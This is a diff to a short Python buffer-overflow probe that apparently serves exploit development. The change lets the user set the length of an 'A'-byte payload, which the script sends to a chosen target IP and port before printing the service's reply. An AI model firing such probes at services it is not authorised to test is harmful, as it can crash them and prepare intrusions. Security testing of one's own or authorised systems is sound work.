@@ -13,17 +13,23 @@ def send():
     """ send payload -- """
     port = int(options.port)
     target = str(options.target)
+    buffer = str(options.buffer)
 
     try:
         print('[+] sending payload')
 
         """ assemble temp sc -- """
-        buffer = b"A" * int(1024)
+        buffer = b"A" * int(buffer)
 
         """ send payload -- """
         s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('%s' % target, port))
+        print("[info]: sending => %s" % buffer)
         s.send(buffer)
+        resp = s.recv(1024)
+        print(resp)
+
+        # close --
         s.close()
 
         print('[+] done')
@@ -40,6 +46,7 @@ if __name__ == "__main__":
     parser = OptionParser()
     parser.add_option('-t', '--target', dest='target', help='target ip address')
     parser.add_option('-p', '--port', dest='port', help='port')
+    parser.add_option('-b', '--buffer', dest='buffer', help='buffer length')
     try:
         (options, args) = parser.parse_args()
         if (options.target):
